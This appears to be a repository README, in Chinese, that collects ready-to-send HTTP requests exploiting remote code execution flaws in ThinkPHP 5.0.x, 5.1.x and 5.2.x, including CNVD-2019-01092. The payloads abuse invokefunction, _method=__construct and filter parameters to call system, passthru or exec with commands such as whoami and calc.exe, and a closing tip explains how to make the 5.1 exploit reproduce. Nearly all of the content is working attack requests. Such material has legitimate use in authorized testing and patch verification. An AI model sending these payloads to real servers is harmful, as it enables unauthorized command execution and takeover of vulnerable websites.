# thinkphp_rce_check

2018年12月爆出的代码执行

```
GET /tp5022/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=path HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
DNT: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Length: 2

```


---
2019年1月陆续爆出的代码执行

CNVD-2019-01092

## thinkphp 5.0.10 以下版本 

```
POST /tp5010/public/index.php?s=index/index/index HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Connection: close
Upgrade-Insecure-Requests: 1

s=whoami&filter%5B%5D=passthru&_method=__construct&method=
```

## thinkphp 5.0.23 以下版本

```
POST /tp5023/public/index.php?s=captcha HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 80

_method=__construct&filter[]=passthru&method=get&server[REQUEST_METHOD]=whoami
或者
_method=__construct&filter[]=system&method=GET&get[]=whoami
```

## thinkphp 5.1.x/5.2.x 版本

利用条件:生产模式/即忽略异常提示，否则会报500错误

```
POST /tp5132/public/index.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 58
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

c=exec&f=calc.exe&&_method=filter&
```

设置`error_reporting(0);`版本不同，位置不一样，一般在start.php或者index.php

```
// [ 应用入口文件 ]
namespace think;

// 加载基础文件
require __DIR__ . '/../thinkphp/base.php';
error_reporting(0);                                                 ----》添加这一行，即可复现
// 支持事先使用静态方法设置Request对象和Config对象

// 执行应用并响应
Container::get('app')->run()->send();
```


